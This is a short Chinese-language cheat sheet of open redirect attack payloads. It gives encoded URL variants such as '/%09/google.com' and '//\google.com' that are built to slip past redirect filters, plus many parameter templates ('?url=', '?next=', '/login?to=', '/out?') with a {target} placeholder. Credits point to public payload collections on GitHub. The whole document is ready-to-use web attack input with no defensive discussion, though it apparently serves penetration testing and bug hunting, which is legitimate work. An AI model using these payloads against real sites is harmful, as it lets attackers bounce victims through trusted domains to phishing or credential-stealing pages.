## 开放的重定向

```
/%09/google.com
```

```
/%5cgoogle.com
```

```
//www.google.com/%2f%2e%2e
```

```
//www.google.com/%2e%2e
```

```
//google.com/
```

```
//google.com/%2f..
```

```
//\google.com
```

```
/\victim.com:80%40google.com
```

## 可能的开放重定向参数

```
?url=http://{target}
```

```
?url=https://{target}
```

```
?next=http://{target}
```

```
?next=https://{target}
```

```
?url=https://{target}
```

```
?url=http://{target}
```

```
?url=//{target}
```

```
?url=$2f%2f{target}
```

```
?next=//{target}
```

```
?next=$2f%2f{target}
```

```
?url=//{target}
```

```
?url=$2f%2f{target}
```

```
?url=//{target}
```

```
/redirect/{target}
```

```
/cgi-bin/redirect.cgi?{target}
```

```
/out/{target}
```

```
/out?{target}
```

```
/out?/{target}
```

```
/out?//{target}
```

```
/out?/\{target}
```

```
/out?///{target}
```

```
?view={target}
```

```
?view=/{target}
```

```
?view=//{target}
```

```
?view=/\{target}
```

```
?view=///{target}
```

```
/login?to={target}
```

```
/login?to=/{target}
```

```
/login?to=//{target}
```

```
/login?to=/\{target}
```

```
/login?to=///{target}
```



**重定向Payloads** by @cujanovic

https://github.com/cujanovic/Open-Redirect-Payloads

**重定向参数** by @fuzzdb-project

https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt

